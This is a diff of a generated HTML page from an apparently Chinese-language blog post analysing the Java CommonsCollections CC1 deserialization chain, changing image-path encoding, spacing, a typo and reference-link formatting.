-<p><img src="/images/JAVA反序列化04/image-20230116115642766.png" srcset="/img/loading.gif" lazyload alt="image-20230116115642766"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116112649822.png" srcset="/img/loading.gif" lazyload alt="image-20230116112649822"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116115642766.png" srcset="/img/loading.gif" lazyload alt="image-20230116115642766"></p>
 <p>第四轮：</p>
-<p>已经拿到Runtime类示例对象，直接执行exec方法</p>
-<p><img src="/images/JAVA反序列化04/image-20230116113107441.png" srcset="/img/loading.gif" lazyload alt="image-20230116113107441"></p>
-<p><img src="/images/JAVA反序列化04/image-20230116115829515.png" srcset="/img/loading.gif" lazyload alt="image-20230116115829515"></p>
+<p>已经拿到 Runtime 类实例对象，直接执行 exec 方法</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116113107441.png" srcset="/img/loading.gif" lazyload alt="image-20230116113107441"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116115829515.png" srcset="/img/loading.gif" lazyload alt="image-20230116115829515"></p>
 <blockquote>
 <p>完结撒花！！第一次分析 Java 经典反序列化链子，还有很多不成熟的地方，但是我已经进步良多。</p>
 </blockquote>
-<h3 id="四-参考链接"><a href="#四-参考链接" class="headerlink" title="四. 参考链接"></a>四. 参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&amp;vd_source=ed636173e6c328be468a244d33ee03e1">白日梦组长大佬</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189755.html">java反序列化(三)CommonsCollections篇 — CC1</a></p>
+<h3 id="四-参考链接"><a href="#四-参考链接" class="headerlink" title="四. 参考链接"></a>四. 参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=ed636173e6c328be468a244d33ee03e1">白日梦组长大佬</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189755.html">java反序列化(三)CommonsCollections篇 – CC1</a></p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#commons-collections">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></p>
 
                 
